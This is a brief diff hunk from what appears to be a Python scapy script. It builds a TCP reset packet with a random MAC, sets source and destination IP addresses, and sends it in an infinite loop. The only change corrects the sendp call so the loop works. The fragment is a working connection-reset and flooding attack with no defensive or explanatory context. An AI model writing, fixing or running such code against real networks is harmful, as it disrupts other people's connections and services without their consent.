@@ -9,4 +9,4 @@ rand_mac = scapy.all.RandMAC()
 rst_packet = scapy.all.Ether(src = rand_mac) / scapy.all.IP(src = src_ip, dst = dst_ip) / scapy.all.TCP(flags = "R") 
 
 while True:
-    sendp(rst_packet)
+    scapy.all.sendp(rst_packet)
